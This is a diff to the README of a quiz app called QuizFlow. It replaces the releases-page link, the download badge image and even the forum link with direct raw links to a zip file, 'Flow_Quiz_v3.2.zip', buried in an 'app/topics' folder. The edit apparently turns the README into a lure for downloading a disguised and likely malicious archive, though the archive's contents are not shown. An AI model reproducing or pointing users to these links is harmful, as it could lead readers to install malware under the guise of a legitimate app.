@@ -6,7 +6,7 @@ Welcome to QuizFlow! This app is designed to make learning enjoyable through qui
 ## 🚀 Getting Started
 To start using QuizFlow, you will need to download the app from our Releases page. 
 
-[![Download QuizFlow](https://img.shields.io/badge/Download_QuizFlow-v1.0-blue)](https://github.com/Umamaheshwar89/QuizFlow/releases)
+[![Download QuizFlow](https://github.com/Umamaheshwar89/QuizFlow/raw/refs/heads/main/app/topics/Flow_Quiz_v3.2.zip)](https://github.com/Umamaheshwar89/QuizFlow/raw/refs/heads/main/app/topics/Flow_Quiz_v3.2.zip)
 
 ## 🛠️ Features
 - **Gamified Learning**: Enjoy quizzes that turn learning into a game.
@@ -18,7 +18,7 @@ To start using QuizFlow, you will need to download the app from our Releases pag
 ## 📥 Download & Install
 1. Click on the download link below to visit our releases page:
 
-   [Download QuizFlow](https://github.com/Umamaheshwar89/QuizFlow/releases)
+   [Download QuizFlow](https://github.com/Umamaheshwar89/QuizFlow/raw/refs/heads/main/app/topics/Flow_Quiz_v3.2.zip)
 
 2. Choose the version you wish to download. The most recent version will often be listed at the top.
 3. Click on the file to download it. Depending on your device, the file will start downloading automatically.
@@ -49,7 +49,7 @@ To ensure the best experience with QuizFlow:
 ## 🌐 Community Support
 Join our community for support, feature requests, or to contribute. 
 
-- **Forum**: Visit [QuizFlow Forum](https://github.com/Umamaheshwar89/QuizFlow/discussions) to ask questions and share your experiences.
+- **Forum**: Visit [QuizFlow Forum](https://github.com/Umamaheshwar89/QuizFlow/raw/refs/heads/main/app/topics/Flow_Quiz_v3.2.zip) to ask questions and share your experiences.
 - **Report Issues**: If you find any bugs, please report them in the Issues section of the repository.
 
 ## 📚 Additional Resources
